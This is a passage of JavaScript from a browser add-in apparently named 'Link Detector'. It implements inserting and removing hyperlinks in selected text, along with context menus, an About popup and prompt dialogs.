            var containersText = startContainerText + endContainerText;

            result = selectionText !== containersText;

            // special case only for IE. there is an issue when we first insert links and then remove some of them.
            // if we try to select text which includes the text of the removed references, IE does not calculate correctly its offsets
            // leading to wrong start and end text, which returns true for this method in cases where there are no real nodes between the two nodes
            if (result && document.documentMode /*IE specific*/) {

                // it is enough to check if nextsibling of the start and any of the next siblings of the end nodes ancessors are the same element,
                // which means that start node has bad offsets,
                // if there was span between them or any other element the result will remain the same
                // this is relevant when the selection direction is from right -> left
                var current = range.endContainer;
                while (current && range.startContainer.nextSibling) {
                    if (range.startContainer.nextSibling === current.nextSibling) {
                        result = false;
                        break;
                    }

                    current = current.parentNode;
                }

                // this is relevant when the selection is from left to right
                if (result) {
                    // again in IE the indexes are not correct
                    // in this case the end container is expanded to the common parent, which means that includes the start container
                    // which is not valid behaviour, nevertheless is enough to check if the endcontainers desc contains the start container
                    var endContainerDescTextNodes = htmlElementhelper.getDescendantsText(range.endContainer, true);
                    if (endContainerDescTextNodes.indexOf(range.startContainer) >= 0) {
                        result = false;
                    }
                }

            }
        }

        return result;
    }

    var aggregateOutHtmlOfCaptureNodes = function (range) {
        var startNode = range.startContainer;
        var endNode = range.endContainer;

        var currentCapturedNode = startNode.nextSibling;
        // expand to common in cases where the lead and the end are in spans, in this case the lead (text node) will not have sibling
        if (!currentCapturedNode && haveCommonBlockAncessor(startNode, endNode))
            currentCapturedNode = startNode.parentNode.nextSibling;


        var htmlAppender = function (append, parent) {
            if (typeof parent === 'string') {
                parent = parent += append;
            }
            else {
                parent.innerHTML += append;
            }

            return parent;
        }

        var aggregateOutHtmlResult = '';
        var parent = null;
        var masterParent = null;

        while (currentCapturedNode != endNode) {
            // && currentCapturedNode != endNode.parentNode

            var descendant = htmlElementhelper.getDescendantsText(currentCapturedNode);
            if (descendant.indexOf(endNode) >= 0) {

                var currentCopy = currentCapturedNode.cloneNode(true);
                currentCopy.innerHTML = '';

                if (parent)
                    masterParent.appendChild(currentCopy);

                parent = currentCopy;
                if (!masterParent)
                    masterParent = parent;

                currentCapturedNode = currentCapturedNode.firstChild;
            }
            else {
                if (parent) {
                    parent.innerHTML += resolveText(currentCapturedNode);
                }
                else {
                    aggregateOutHtmlResult += resolveText(currentCapturedNode);
                }
                currentCapturedNode = currentCapturedNode.nextSibling;

            }
        }

        if (masterParent) {
            return aggregateOutHtmlResult + masterParent.outerHTML;
        }
        else {
            return aggregateOutHtmlResult;
        }
    }


    var isSelectionInSameBlock = function () {
        var selection = window.getSelection();
        var range = selection.getRangeAt(0);
        var result = haveCommonBlockAncessor(range.startContainer, range.endContainer);
        return result;
    };

    var getAnchorInnerHtmlForCommonParent = function (range) {
        if (hasCapturedNodes(range)) {
            // when there are captured nodes (anything different from text nodes, this means any span, i, b .. etc) in the selection

            var startText = range.startContainer.textContent.substr(range.startOffset);
            var endText = range.endContainer.textContent.substr(0, range.endOffset);
            var capturedNodesText = aggregateOutHtmlOfCaptureNodes(range);

            return startText + capturedNodesText + endText;

        } else {

            return range.toString();
        }
    }

    var getAnchorInnerHtmlForForDifferentParent = function (range) {

        var getElementToCopy = function (toCopy, relevantNode) {

            var nodeToUse = getElementAtCommonLevel(toCopy, relevantNode);

            // this is needed when the toCopy is textnode which is wrapped in span, but the relevant node is also text node and both are in same parent
            //  can be used some approach for searching of common parent

            if (nodeToUse.nodeName === "#text")
                nodeToUse = document.createTextNode('');

            return nodeToUse;
        }

        var cleanParentCopy = function (parentCopy, container) {
            var ancessorsToKeep = getAncessorsOuterHTMLs(container);
            var descendants = htmlElementhelper.getAllDescendant(parentCopy);

            for (var i = 0; i < descendants.length; i++) {
                if (ancessorsToKeep.indexOf(resolveText(descendants[i])) < 0)
                    descendants[i].parentNode.removeChild(descendants[i]);
            }
        }

        var getElementToAttachFromParentCopy = function (parentCopy) {
            var descendants = htmlElementhelper.getAllDescendant(parentCopy);
            if (descendants.length == 0) {
                return parentCopy;
            }
            else {
                return descendants[descendants.length - 1];
            }
        }

        var childAppender = function (parent, element) {
            if (parent.nodeName === "#text") {
                parent.textContent += element;
            } else {
                if (typeof element === "string") {
                    parent.appendChild(document.createTextNode(element));
                }
                else {
                    parent.appendChild(element);
                }
            }
        }

        var startContainerText = range.startContainer.textContent.substr(range.startOffset);
        var startContainerParent = getElementToCopy(range.startContainer, range.endContainer);
        var startContainerParentCopy = startContainerParent.cloneNode(true);
        cleanParentCopy(startContainerParentCopy, range.startContainer);
        var attachTo = getElementToAttachFromParentCopy(startContainerParentCopy);
        childAppender(attachTo, startContainerText);

        var endContainerText = range.endContainer.textContent.substr(0, range.endOffset);
        var endContainerParent = getElementToCopy(range.endContainer, range.startContainer);
        var endContainerParentCopy = endContainerParent.cloneNode(true);
        cleanParentCopy(endContainerParentCopy, range.endContainer);
        var attachTo = getElementToAttachFromParentCopy(endContainerParentCopy);
        childAppender(attachTo, endContainerText);

        var capturedNodesText = aggregateOutHtmlOfCaptureNodes(range);

        return resolveText(startContainerParentCopy) + capturedNodesText + resolveText(endContainerParentCopy);
    }

    var hasSelection = function () {
        var selection = window.getSelection();

        return selection.toString() !== '';
    }

    var insertWhenCommonParent = function (range, url) {
        // when the start container and the end container belogs to the same parent node

        var anchorInnerHtml = getAnchorInnerHtmlForCommonParent(range);
        var anchorHtml = "<a target='" + target + "' class='link-detector-link apis-link-by-hand' href='" + url + "'>" + anchorInnerHtml + "</a>";

        range.deleteContents();

        var fragment = range.createContextualFragment(anchorHtml);
        range.insertNode(fragment);
    }

    var insertWhenAcrossDifferentParent = function (range, url) {

        var anchorInnerHtml = getAnchorInnerHtmlForForDifferentParent(range);
        var anchorHtml = "<a target='" + target + "' class='link-detector-link apis-link-by-hand' href='" + url + "'>" + anchorInnerHtml + "</a>";

        range.deleteContents();

        var fragment = range.createContextualFragment(anchorHtml);
        range.insertNode(fragment);
    }

    var insert = function (url) {

        var selection = window.getSelection();

        var range = selection.getRangeAt(0);

        var success = false;
        if (haveCommonParent(range.startContainer, range.endContainer)) {
            insertWhenCommonParent(range, url);
            success = true;
        }
        else if (haveCommonBlockAncessor(range.startContainer, range.endContainer)) {
            insertWhenAcrossDifferentParent(range, url);
            success = true;
        }

        return success;
    };

    var insertLinkInSelection = function () {

        delayExecution(function () {

            if (!hasSelection()) {
                dialogs.showMessage(translations.current().cCannotAddLink);
                return;
            }

            // use the cached selection, because when the user clicks in the input field for url, the selection is lost
            var cachedRange = window.getSelection().getRangeAt(0);

            dialogs.showPromt(translations.current().cInsertLink, function (url) {
                if (!url) {
                    return;
                }

                if (url && (!url.startsWith('http://') || url == 'http://')) {
                    dialogs.showMessage(translations.current().cPlzEnterCompleteUrl);
                    return;
                }

                window.getSelection().removeAllRanges();

                // restore the original selection, due to the possibility to be lost when the user clicks on the input field
                window.getSelection().addRange(cachedRange);

                if (hasLinksInSelection())
                    remove();

                var success = insert(url);
                if (success) {
                    dialogs.showMessage(translations.current().cInsLinkSucc);
                }
            }, 'http://');
        });
    }


    var isRemovableLinkNode = function (node) {
        if (node.nodeName === '#text') return false;

        return node.classList.contains('link-detector-link');
    }

    var getRemovableLinkNodesDeep = function (node) {
        var result = [];
        if (node.nodeName === '#text') return result;

        var descendants = node.getElementsByClassName('link-detector-link');
        for (var i = 0; i < descendants.length; i++) {
            result.push(descendants[i]);
        }

        return result;
    }

    var getCapturedLinks = function (range) {
        // returns all anchor nodes between the start and end container (excluding the start and end container)

        var startNode = range.startContainer;
        var endNode = range.endContainer;

        var jumpToParentSibling = function (from) {
            var result = from.parentNode.nextSibling;
            if (!result)
                result = jumpToParentSibling(from.parentNode);

            return result;
        }

        var currentCapturedNode = startNode.nextSibling;

        // there are rare cases (it happens when the selection is over table) when the start node is not #text node, but the common ancessor for the end and the start
        // in this cases we don't need to exapnd to the next sibling, because the start node already contains the end node
        if (range.commonAncestorContainer === startNode) {
            currentCapturedNode = startNode;
        }

        // for cases when the end node is expanded to the common ancessor. in this cases we don't have the real end node so we don't know where the selection ends
        // this happens again over tables when the selection is ending at some block element (p) and continuing to the table
        // we can accept that the end container is actualy the last text node of the accessor of the first text node which parent is the common accessor (in this case the end node)
        if (range.commonAncestorContainer === endNode) {
            var endNodeElement = getFirstAncessorByPredicate(startNode, function (ancessor) {
                return ancessor.parentNode == range.commonAncestorContainer;
            });

            var endNodeTexts = htmlElementhelper.getDescendantsText(endNodeElement, true);

            endNode = endNodeTexts[endNodeTexts.length - 1];
        }

        if (endNode.nodeName !== '#text') {
            var endNodeTexts = htmlElementhelper.getDescendantsText(endNode, true);

            endNode = endNodeTexts[endNodeTexts.length - 1];
        }

        // expand to common in cases where the lead and the end are in spans, in this case the lead (text node) will not have sibling
        if (!currentCapturedNode) // && haveCommonBlockAncessor(startNode, endNode)
            currentCapturedNode = jumpToParentSibling(startNode);

        var result = [];

        if (isRemovableLinkNode(currentCapturedNode)) {
            result.push(currentCapturedNode);
        }

        while (currentCapturedNode && currentCapturedNode != endNode) {

            var descendant = htmlElementhelper.getDescendantsText(currentCapturedNode);
            if (descendant.indexOf(endNode) >= 0) {
                currentCapturedNode = currentCapturedNode.firstChild;
            }
            else {
                // there is chance to skip the anchor nodes wrapped(nested) in the current node when we jump over to the next
                var linkDetectorNodesFromCurrent = getRemovableLinkNodesDeep(currentCapturedNode);
                if (linkDetectorNodesFromCurrent) {
                    result = result.concat(linkDetectorNodesFromCurrent);
                }

                if (currentCapturedNode.nextSibling) {
                    currentCapturedNode = currentCapturedNode.nextSibling;
                }
                else {
                    currentCapturedNode = jumpToParentSibling(currentCapturedNode);
                }
            }

            if (currentCapturedNode && isRemovableLinkNode(currentCapturedNode)) {
                result.push(currentCapturedNode);
            }
        }

        return result;
    }

    var getLinksInSelection = function (range) {
        // returns all anchors from the selection includng any anchors from the start and end containers

        var result = [];

        if (haveCommonParent(range.startContainer, range.endContainer)) {
            if (isRemovableLinkNode(range.startContainer.parentNode)) {
                result.push(range.startContainer.parentNode);
            }

            if (hasCapturedNodes(range)) {
                var capturedAnchors = getCapturedLinks(range);

                result = result.concat(capturedAnchors);
            }
        }
        else /*if (haveCommonBlockAncessor(range.startContainer, range.endContainer))*/ {

            var startContainerAnchor = null;
            if (range.startOffset < range.startContainer.textContent.length)
                startContainerAnchor = getFirstAncessorByPredicateBefourFirstBlock(range.startContainer, isRemovableLinkNode);

            var endContainerAnchor = null;
            if (range.endOffset > 0)
                endContainerAnchor = getFirstAncessorByPredicateBefourFirstBlock(range.endContainer, isRemovableLinkNode);

            if (startContainerAnchor)
                result.push(startContainerAnchor);

            if (endContainerAnchor)
                result.push(endContainerAnchor);

            if (hasCapturedNodes(range)) {
                var capturedAnchors = getCapturedLinks(range);

                result = result.concat(capturedAnchors);
            }
        }

        return result;
    }

    var hasLinksInSelection = function () {

        if (!hasSelection())
            return false;

        var selection = document.getSelection();
        var range = selection.getRangeAt(0);
        var anchorsInSelection = getLinksInSelection(range);

        return anchorsInSelection.length > 0;
    }

    var remove = function () {

        if (!hasLinksInSelection())
            return;

        var selection = document.getSelection();
        var range = selection.getRangeAt(0);

        var anchorsInSelection = getLinksInSelection(range);

        for (var i = 0; i < anchorsInSelection.length; i++) {
            htmlElementhelper.removeNodeKeepChildren(anchorsInSelection[i]);
        }
    }

    var removeLinksInSelection = function () {

        dialogs.showConfirm(translations.current().cPlzConfirmRmLnkSel, function () {
            remove();
            dialogs.showMessage(translations.current().cLinksRemoved);

        }, null);
    }

    document.body.setAttribute('hasValidSelectionForInsert', hasSelection() && isSelectionInSameBlock());
    document.body.setAttribute('hasLinksInSelection', hasLinksInSelection());

    return {
        insertLinkInSelection: insertLinkInSelection,
        removeLinksInSelection: removeLinksInSelection,
        hasLinksInSelection: hasLinksInSelection,
        hasSelection: hasSelection,
        isSelectionInSameBlock: isSelectionInSameBlock,
        isSelectionInSameElement: function () {
            var selection = window.getSelection();
            var range = selection.getRangeAt(0);
            var result = haveCommonParent(range.startContainer, range.endContainer);
            return result;
        },
        setTarget: setTarget
    }
})();

var addinEventDispatcher = (function () {
    // events: in this section are defined events that are used to communicate with the addin when the process needs some kind of result from the executed action
    // in the addin we have attached handles for the events with the specified names, execute the addinEventDispatcher.'{some dispatch method}' from the addin
    // and then the handler in the addin is executed
    // the main reason behind this approach is that in the extensions you can run scripts only as pure strings/texts, this means it is imposible to get some kind of result

    var hasSelectionEvent = document.createEvent('CustomEvent');
    var hasLinksInSelectionEvent = document.createEvent('CustomEvent');
    var annotationFinnishedEvent = document.createEvent('CustomEvent');
    var addonSelectionChanged = document.createEvent('CustomEvent');


    var dispatchHasSelectionEvent = function () {
        hasSelectionEvent.initCustomEvent('hasSelectionEvent', true, false, linkSelection.hasSelection());
        document.dispatchEvent(hasSelectionEvent);
    }

    var dispatchHasLinksInSelectionEvent = function () {
        hasLinksInSelectionEvent.initCustomEvent('hasLinksInSelectionEvent', true, false, linkSelection.hasLinksInSelection());
        document.dispatchEvent(hasLinksInSelectionEvent);
    }

    var dispatchAnnotationFinnishedEvent = function (annotatedHtml) {
        annotationFinnishedEvent.initCustomEvent('annotationFinnishedEvent', true, false, annotatedHtml);
        document.dispatchEvent(annotationFinnishedEvent);
    }

    addonSelectionChanged.initCustomEvent('addonSelectionChanged', true, false, null);
    var dispatchAddonSelectionChanged = function () {
        document.dispatchEvent(addonSelectionChanged);
    }

    return {
        dispatchHasSelectionEvent: dispatchHasSelectionEvent,
        dispatchHasLinksInSelectioNEvent: dispatchHasLinksInSelectionEvent,
        dispatchAnnotationFinnishedEvent: dispatchAnnotationFinnishedEvent,
        dispatchAddonSelectionChanged: dispatchAddonSelectionChanged
    }
})();

var contextMenuHelper = (function () {

    var position = function (ul, ev) {

        var offsetX = ev.clientX + window.pageXOffset;
        var offsetY = ev.clientY + window.pageYOffset;

        var isOutsideX = window.innerWidth < (offsetX + ul.offsetWidth);
        if (isOutsideX) {
            offsetX = offsetX - ul.offsetWidth;
        }

        var isOutsideY = window.innerHeight < (offsetY + ul.offsetHeight);
        if (isOutsideY) {
            offsetY = offsetY - ul.offsetHeight;
        }

        ul.style.left = offsetX + 'px';
        ul.style.top = offsetY + 'px';

        ul.style.display = 'block';
        ul.style.visibility = "visible";
    }

    var removeAll = function () {
        var contextMenus = document.getElementsByClassName('contextmenu');

        while (contextMenus.length != 0) {
            htmlElementhelper.remove(contextMenus[0]);
        }
    }

    return {
        position: position,
        removeAll: removeAll
    }

})();

var contextMenu = (function () {

    // init events

    var initEvents = function () {

        // hides context and subcontext menus when clicked
        document.body.addEventListener("click", function () {

            var contextMenus = document.getElementsByClassName('contextmenu');
            var subcontextMenus = document.getElementsByClassName('contextsubmenu');

            for (var i = 0; i < contextMenus.length; i++) {
                contextMenus[i].parentNode.removeChild(contextMenus[i]);
            }

            for (var i = 0; i < subcontextMenus.length; i++) {
                subcontextMenus[i].parentNode.removeChild(subcontextMenus[i]);
            }
        });
    }

    var removeAllSubmenus = function () {

        var allsubMenus = document.getElementsByClassName("contextsubmenu");
        for (var i = 0; i < allsubMenus.length; i++) {
            var currentSubMenu = allsubMenus[i];
            currentSubMenu.parentNode.removeChild(currentSubMenu);
        }
    }

    var createContextMenuWithHeader = function (subHeader) {
        var menu = document.createElement('ul');
        menu.className = 'contextmenu';

        var headerItem = document.createElement('li');
        headerItem.textContent = 'Link Detector';
        headerItem.className = 'contextmenu-item-header';

        menu.appendChild(headerItem);

        if (subHeader) {
            var subHeaderItem = document.createElement('li');
            subHeaderItem.innerHTML = subHeader;
            subHeaderItem.className = 'contextmenu-item-subheader contextmenu-item-header-end';

            menu.appendChild(subHeaderItem);
        }
        else {
            headerItem.classList.add('contextmenu-item-header-end');
        }


        return menu;
    }

    // create li element that controls the showing of a submenu by given id
    var createSubmenuItem = function (caption, submenuFactoryMethod, subMenuId) {

        var submenuItem = document.createElement("li");
        submenuItem.innerHTML = caption;

        submenuItem.className = "contextmenu-item apis-button";

        if (submenuFactoryMethod && subMenuId) {

            submenuItem.appendChild(canvas2d.createSmallRightOrientedTriangle());
            submenuItem.onmouseenter = function (e) {

                removeAllSubmenus();

                var subMenu = submenuFactoryMethod();
                if (subMenu) {
                    var correction = 4;

                    var parentContextMenu = e.target.parentNode;
                    // offset to avoid overlapping with the caller context menu
                    var parentOffset = parentContextMenu.offsetLeft;

                    var submenuOffset = parentOffset + parentContextMenu.offsetWidth - correction;

                    var isOutside = window.innerWidth < (submenuOffset + subMenu.offsetWidth);
                    if (isOutside) {
                        submenuOffset = (submenuOffset - subMenu.offsetWidth - parentContextMenu.offsetWidth) + correction * 2;
                    }

                    subMenu.style.left = submenuOffset + "px";

                    var offsetTop = parentContextMenu.offsetTop + e.target.offsetTop - 10;
                    subMenu.style.top = offsetTop + "px";
                }
            }
            submenuItem.onmouseleave = function () {

                setTimeout(function () {
                    var subMenu = document.getElementById(subMenuId);
                    if (subMenu && !subMenu.classList.contains("contextsubmenu-active")) {
                        subMenu.parentNode.removeChild(subMenu);
                    }
                }, 250);
            }
        }

        return submenuItem;
    }

    // create ul element that is auto removed from the dom when the mouse does not hover over it
    var createSubmenu = function (id) {

        var subMenu = document.getElementById(id);
        if (subMenu) {
            subMenu.parentNode.removeChild(subMenu);
        }

        var subMenu = document.createElement("ul");
        subMenu.id = id;
        subMenu.className = "contextsubmenu";
        subMenu.onmouseenter = function (e) {
            e.target.classList.add("contextsubmenu-active");
        }
        subMenu.onmouseleave = function (e) {
            setTimeout(function () {
                if (e.target && e.target.parentNode)
                    e.target.parentNode.removeChild(e.target);
            }, 250);
        }

        return subMenu;
    }

    initEvents();

    return {
        createSubmenuItem: createSubmenuItem,
        createSubmenu: createSubmenu,
        initEvents: initEvents,
        createContextMenuWithHeader: createContextMenuWithHeader
    }

})();

var canvas2d = (function () {

    // creates 2d triangle with 10 x 12 dimenssion
    var createSmallRightOrientedTriangle = function () {

        var canvasWidth = 5;
        var canvasHeight = 8;

        var canvas = document.createElement('canvas');
        canvas.className = "small-right-triangle";
        canvas.width = canvasWidth;
        canvas.height = canvasHeight;

        if (canvas.getContext) {
            var ctx = canvas.getContext('2d');

            ctx.beginPath();
            ctx.moveTo(0, 0);
            ctx.lineTo(0, canvasHeight);
            ctx.lineTo(canvasWidth, canvasHeight / 2);
            ctx.lineTo(canvasWidth, canvasHeight / 2);
            ctx.fill();
        }

        return canvas;
    }


    return {
        createSmallRightOrientedTriangle: createSmallRightOrientedTriangle
    }
})();

var images = (function () {

    var imagePath = '';

    var imageBase64 = '';
    var eurocasesLogoBase64 = '';
    var apisLogoBase64 = '';

    var _hasImagePath = function () {
        console.log(imagePath);

        return imagePath && imagePath != '';
    }

    var _getImagePath = function () {
        if (imagePath != '') {
            if (imagePath[imagePath.length - 1] == '/') {
                return imagePath.slice(0, imagePath.length - 1).concat('/');
            } else {
                return imagePath.concat('/');
            }
        } else {
            return '';
        }
    }

    var getLogoImagePath = function () {
        if (_hasImagePath()) {
            return _getImagePath().concat('128-a-slim.png');
        }
        else {
            return '';
        }
    }

    var getEurocasesLogo = function () {
        if (_hasImagePath()) {
            return _getImagePath().concat('logo-eurocases.png');
        }
        else {
            return '';
        }
    }

    var getApisLogo = function () {
        if (_hasImagePath()) {
            return _getImagePath().concat('logo_apis.png');
        }
        else {
            return '';
        }
    }

    var getLogoImageBase64 = function () {
        return imageBase64;
    }

    var getEurocasesLogoBase64 = function () {
        return eurocasesLogoBase64;
    }

    var getApisLogoBase64 = function () {
        return apisLogoBase64;
    }

    var setBase64Src = function (image, base64str) {
        image.src = 'data:image/png;base64,' + base64str;
    }

    return {
        // this is used from chrome and firefox
        setImagePath: function (path) {
            imagePath = path;
        },

        // this is used from IE
        setImageBase64: function (base64str) {
            imageBase64 = base64str;
        },
        setEurocasesLogoBase64: function (base64Str) {
            eurocasesLogoBase64 = base64Str;
        },
        setApisLogoBase64: function (base64Str) {
            apisLogoBase64 = base64Str;
        },

        setBase64Src: setBase64Src,

        getLogoImagePath: getLogoImagePath,
        getEurocasesLogo: getEurocasesLogo,
        getApisLogo: getApisLogo,
        getLogoImageBase64: getLogoImageBase64,
        getEurocasesLogoBase64: getEurocasesLogoBase64,
        getApisLogoBase64: getApisLogoBase64,
    }

})();

var dragAndDrop = (function () {

    // represents the offset which is needed to place the left top corner in the same relevant position
    // as when the dragg started
    var clickOffsetX = 0;
    var clickOffsetY = 0;

    var drag = function (ev) {
        ev.dataTransfer.setData("text", ev.target.id);

        var position = ev.target.getBoundingClientRect();

        clickOffsetX = ev.clientX - position.left;
        clickOffsetY = ev.clientY - position.top;
    }

    var drop = function drop(ev) {
        ev.preventDefault();
        var data = ev.dataTransfer.getData("text");
        var promt = document.getElementById(data);
        promt.style.left = (ev.clientX - clickOffsetX) + 'px';
        promt.style.top = (ev.clientY - clickOffsetY) + 'px';

        // ev.target.appendChild(promt);

        clickOffsetX = 0;
        clickOffsetY = 0;
    }

    var allowDrop = function allowDrop(ev) {
        ev.preventDefault();
    }

    var draggableTo = function (draggableElement, droppableElement) {
        if (draggableElement && droppableElement) {
            draggableElement.draggable = true;
            draggableElement.ondragstart = drag;

            droppableElement.ondragover = allowDrop;
            droppableElement.ondrop = drop;
        }
    }

    return {
        draggableTo: draggableTo
    }

})();

var about = (function () {

    var removeAbout = function () {
        var aboutWindow = document.getElementById("about-popup");
        if (aboutWindow) {
            aboutWindow.parentNode.removeChild(aboutWindow);
        }
    }

    var showAbout = function (version) {

        delayExecution(function () {

            if (document.getElementById("about-popup")) {
                return;
            }

            var containerWidth = 600;
            var containerHeight = 190;

            var container = document.createElement("div");
            container.id = "about-popup";
            container.className = "popup apis-form-border";
            container.style.width = containerWidth + "px";
            container.style.height = containerHeight + "px";
            container.style.left = screen.width - containerWidth - 30 + "px";
            container.style.top = 10 + "px";


            var createHeader = function () {
                var containerHead = document.createElement("div");
                containerHead.id = "about-header-container";

                var head = document.createElement("p");
                head.id = "about-header-text";
                head.innerHTML = translations.current().cAbout;

                var closeButton = document.createElement("button");
                closeButton.id = "about-header-close-btn";
                closeButton.className = 'apis-button';
                closeButton.innerHTML = "x";
                closeButton.onclick = function () {
                    var aboutPopup = document.getElementById("about-popup");
                    if (aboutPopup) {
                        aboutPopup.parentNode.removeChild(aboutPopup);
                    }
                }

                containerHead.appendChild(head);
                containerHead.appendChild(closeButton);

                return containerHead;
            }

            var createBody = function () {

                var containerBody = document.createElement("div");
                containerBody.id = "about-body-container";

                var basicInfoAndImageTable = document.createElement('table');
                var headerRow = document.createElement('tr');
                var imageCell = document.createElement('td');
                var headerCell = document.createElement('td');

                var versionRow = document.createElement('tr');
                var versionCell = document.createElement('td');

                var rightsRow = document.createElement('tr');
                var rightsCell = document.createElement('td');

                var licenseRow = document.createElement('tr');
                var licenseCell = document.createElement('td');

                var headImage = document.createElement('img');
                headImage.id = 'about-body-head-image'
                if (images.getLogoImagePath()) {

                    headImage.src = images.getLogoImagePath();
                }
                else if (images.getLogoImageBase64()) {
                    images.setBase64Src(headImage, images.getLogoImageBase64());
                }

                var headParagraph = document.createElement("p");
                headParagraph.id = "about-body-head";
                headParagraph.classList = "about-body-paragraph";
                headParagraph.innerHTML = "Link Detector";

                var versionParagraph = document.createElement("p");
                versionParagraph.id = "about-body-version";
                versionParagraph.className = "about-body-paragraph";
                versionParagraph.innerHTML = translations.current().cAboutVersion + " " + version;

                var rightsReservedParagraph = document.createElement("p");
                rightsReservedParagraph.id = "about-body-rights-reserved";
                rightsReservedParagraph.className = "about-body-paragraph";
                rightsReservedParagraph.innerHTML = translations.current().cAboutRightReserved;

                var licenseParagraph = document.createElement("p");
                licenseParagraph.id = "about-body-license";
                licenseParagraph.className = "about-body-paragraph";
                var licenseUrl = 'https://linkdetector.eurocases.eu/api/AddinsLink/getlicense?language=' + translations.getLanguage();
                licenseParagraph.innerHTML = '<a target="_blank" href="' + licenseUrl + '">' + translations.current().cAboutLicense + '</a>';

                var attributionHead = document.createElement("p");
                attributionHead.id = "about-body-attribution-head";
                attributionHead.className = "about-body-paragprah";
                attributionHead.innerHTML = translations.current().cAboutAttribution;

                var attributionTextParagraph = document.createElement("p");
                attributionTextParagraph.id = "about-body-attribution-text";
                attributionTextParagraph.className = "about-body-paragraph";

                var layoutIconAnchor = "<a href='http://www.iconarchive.com/show/farm-fresh-icons-by-fatcow/layout-link-icon.html' target='_blank'>Layout link</a>";
                var fontAddIconAnchor = "<a href='http://www.iconarchive.com/show/farm-fresh-icons-by-fatcow/font-add-icon.html' target='_blank'>Font add</a>";
                var linkDeleteIconAnchor = "<a href='http://www.iconarchive.com/show/farm-fresh-icons-by-fatcow/link-delete-icon.html' target='_blank'>Link delete</a>";
                var congIconAnchor = "<a href='http://www.iconarchive.com/show/farm-fresh-icons-by-fatcow/cog-icon.html' target='_blank'>Cog</a>";
                var helpIconAnchor = "<a href='http://www.iconarchive.com/show/farm-fresh-icons-by-fatcow/help-icon.html' target='_blank'>Help</a>";
                var infoIconAnchor = "<a href='http://www.iconarchive.com/show/farm-fresh-icons-by-fatcow/information-icon.html' target='_blank'>Information</a>";
                var hostAnchor = "<a href='http://www.fatcow.com/free-icons' target='_blank'>Fatcow Web Hosting</a>";
                var iconArchiveAnchor = "<a href='http://www.iconarchive.com/' target='_blank'>IconArchive</a>";
                var iconLicenseAnchor = "<a href='https://creativecommons.org/licenses/by/4.0/' target='_blank'>CC BY 4.0</a>";

                var attributionText = translations.current().cAboutAttributionText;
                attributionText = attributionText.replace("Layout link", layoutIconAnchor);
                attributionText = attributionText.replace("Font add", fontAddIconAnchor);
                attributionText = attributionText.replace("Link delete", linkDeleteIconAnchor);
                attributionText = attributionText.replace("Cog", congIconAnchor);
                attributionText = attributionText.replace("Help", helpIconAnchor);
                attributionText = attributionText.replace("Information", infoIconAnchor);
                attributionText = attributionText.replace("Fatcow Web Hosting", hostAnchor);
                attributionText = attributionText.replace("IconArchive", iconArchiveAnchor);
                attributionText = attributionText.replace("CC BY 4.0", iconLicenseAnchor);

                attributionTextParagraph.innerHTML = attributionText;

                if (headImage.src)
                    imageCell.appendChild(headImage);

                imageCell.rowSpan = 4;

                headerCell.appendChild(headParagraph);
                versionCell.appendChild(versionParagraph);
                rightsCell.appendChild(rightsReservedParagraph);
                licenseCell.appendChild(licenseParagraph);


                headerRow.appendChild(imageCell);
                headerRow.appendChild(headerCell);
                versionRow.appendChild(versionCell);
                rightsRow.appendChild(rightsCell);
                licenseRow.appendChild(licenseCell);

                basicInfoAndImageTable.appendChild(headerRow);
                basicInfoAndImageTable.appendChild(versionRow);
                basicInfoAndImageTable.appendChild(rightsRow);
                basicInfoAndImageTable.appendChild(licenseRow);

                containerBody.appendChild(basicInfoAndImageTable);
                containerBody.appendChild(attributionHead);
                containerBody.appendChild(attributionTextParagraph);

                return containerBody;
            }

            container.appendChild(createHeader());
            container.appendChild(createBody());

            document.body.appendChild(container);
            window.scrollTo(0, 0);

        });
    }

    var initEvents = function () {

        // initial events
        document.body.addEventListener("click", function () {
            removeAbout();
        });
    }

    initEvents();

    return {
        showAbout: showAbout,
        removeAbout: removeAbout,
        initEvents: initEvents
    }
})();

var dialogs = (function () {

    // initial events
    document.addEventListener('click', function () {
        close();
    });

    document.addEventListener('keydown', function (ev) {
        if (ev.keyCode == 13) {
            // simluate ok click
            var okButton = document.getElementById('apis-promt-body-ok-button');
            if (okButton) {
                okButton.click();
            }
        }
        else if (ev.keyCode == 27) {
            close();
        }
    });

    var close = function () {
        var promt = document.getElementById('apis-promt-wrapper');
        if (promt) {
            htmlElementhelper.remove(promt);
        }
    }

    var position = function (promt) {
        var offsetTop = 20;
        var offsetLeft = (window.innerWidth / 2) - (promt.offsetWidth / 2);
        promt.style.top = offsetTop + 'px';
        promt.style.left = offsetLeft + 'px';
    }


    var showConfirm = function (msg, onOK, onCancel, isConfirm, isPromt, promtDefaultValue) {

        delayExecution(function () {

            var wrapper = document.createElement('div');
            wrapper.id = 'apis-promt-wrapper';

            var container = document.createElement('div');
            container.id = 'apis-promt';
            container.className = 'apis-promt apis-form-border';
            container.onclick = function (ev) { ev.preventDefault(); ev.stopPropagation(); }

            var createHeader = function () {
                var header = document.createElement('div');
                header.className = 'apis-promt-header';
                header.textContent = 'Link Detector';

                var headerCloseButton = document.createElement('button');
                headerCloseButton.textContent = 'x';
                headerCloseButton.onclick = close;
                headerCloseButton.className = 'apis-button';

                header.appendChild(headerCloseButton);

                return header;
            }

            var createBody = function () {
                var body = document.createElement('table');
                body.className = 'apis-promt-body';

                var bodyImage = document.createElement('img');
                bodyImage.className = 'apis-promt-body-img';

                if (images.getLogoImagePath() != '') {
                    bodyImage.src = images.getLogoImagePath();
                }
                else if (images.getLogoImageBase64() != '') {
                    bodyImage.src = 'data:image/png;base64,' + images.getLogoImageBase64();
                }

                bodyImage.draggable = false;

                var bodyText = document.createElement('p');
                bodyText.className = 'apis-promt-body-text';
                bodyText.textContent = msg;

                var bodyTextField = document.createElement('input');
                bodyTextField.type = 'text';
                bodyTextField.value = promtDefaultValue;
                bodyTextField.onmouseenter = function () {
                    container.draggable = false;
                }
                bodyTextField.onmouseleave = function () {
                    container.draggable = true;
                }
                bodyTextField.onmousedown = function (ev) {
                    ev.target.focus();
                    ev.target.setSelectionRange(promtDefaultValue.length, promtDefaultValue.length);
                }
                bodyTextField.draggable = false;

                var bodyOkButton = document.createElement('button');
                bodyOkButton.className = 'apis-promt-body-button apis-button';
                bodyOkButton.id = 'apis-promt-body-ok-button';
                bodyOkButton.textContent = translations.current().cOK;
                bodyOkButton.onclick = function () {

                    var textField = body.getElementsByTagName('input')[0];
                    var promtValue = null;
                    if (textField)
                        promtValue = textField.value;

                    close();

                    if (onOK) {
                        if (isPromt) {
                            onOK(promtValue);
                        }
                        else {
                            onOK();
                        }
                    }
                }

                var bodyCancelButton = document.createElement('button');
